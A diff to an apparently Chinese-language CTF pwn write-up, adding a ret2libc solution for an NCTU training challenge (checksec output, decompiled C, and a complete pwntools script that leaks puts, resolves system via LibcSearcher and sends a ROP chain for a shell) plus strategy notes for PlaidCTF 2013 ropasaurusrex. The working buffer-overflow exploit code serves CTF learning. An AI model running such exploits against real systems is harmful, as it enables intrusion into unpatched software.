@@ -488,7 +488,7 @@ r.sendline('/bin/sh\x00')
 r.interactive()
 ```
 
-带哥给的 exp 里直接返回到 main 函数再次溢出，不过这里的偏移又不一样了，所以要再调试到那算一下：
+带哥给的 exp 里直接返回到 main 函数再次溢出，不过这里的偏移又不一样了，所以要再调试到那算一下。
 
 ```python
 ##coding=utf8
@@ -528,4 +528,96 @@ rop2 = [
 r.sendlineafter('Can you find it !?', 'a'*104 + ''.join(map(p32, rop2)))
 r.interactive()
 ```
+
+## train.cs.nctu.edu.tw: ret2libc
+
+```shell
+gef➤  checksec
+[+] checksec for '/home/kali/pwn/ret2libc'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+```
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+1Ch] [ebp-14h]
+
+  puts("Hello!");
+  printf("The address of \"/bin/sh\" is %p\n", binsh);
+  printf("The address of function \"puts\" is 0x%x\n", &puts);
+  fflush(stdout);
+  return __isoc99_scanf("%s", &v4);
+}
+```
+
+运行后输出 /bin/sh 和 puts 的地址，通过 LibcSearcher 找 libc 版本，然后导出 system 地址。不过在本地用 libc 实属8行
+
+```python
+##coding=utf8
+from pwn import *
+from LibcSearcher import *
+
+r = remote('bamboofox.cs.nctu.edu.tw', 11002)
+
+offset = 0xffffd5e8 - 0xffffd5cc + 4
+r.recvuntil('is ')
+bin_sh = int(r.recvuntil('\n'), 16)
+print '/bin/sh =', hex(bin_sh)
+r.recvuntil('is ')
+puts = int(r.recvuntil('\n'), 16)
+print 'puts =', hex(puts)
+
+libc = LibcSearcher('puts', puts)
+# libc.add_condition('str_bin_sh', bin_sh)
+libc_base = puts - libc.dump('puts')
+print 'system =', hex(libc.dump('system'))
+system = libc_base + libc.dump('system')
+
+rop = [
+    system,
+    0xdeadbeef,
+    bin_sh,
+]
+
+r.sendline('a'*offset + ''.join(map(p32, rop)))
+r.interactive()
+```
+
+## train.cs.nctu.edu.tw: rop
+
+
+
+## 2013-PlaidCTF-ropasaurusrex
+
+```shell
+gef➤  checksec
+[+] checksec for '/home/kali/pwn/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'
+Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : ✘ 
+```
+
+```c
+ssize_t __cdecl main()
+{
+  ReadStr();
+  return write(1, "WIN\n", 4u);
+}
+ssize_t ReadStr()
+{
+  char buf; // [esp+10h] [ebp-88h]
+
+  return read(0, &buf, 0x100u);
+}
+```
+
+看到还是有溢出，开了 NX 还是不用想 shellcode 了。程序内没找到 system 和 /bin/sh，那就得 ret2lib 。本地没法加载给的 libc，所以这个题写 exp 的意义也不大。思路就是泄露 read 的 got，然后用 read 读入 /bin/sh，在调 system。
+
+## Defcon 2015 Qualifier: R0pbaby
 
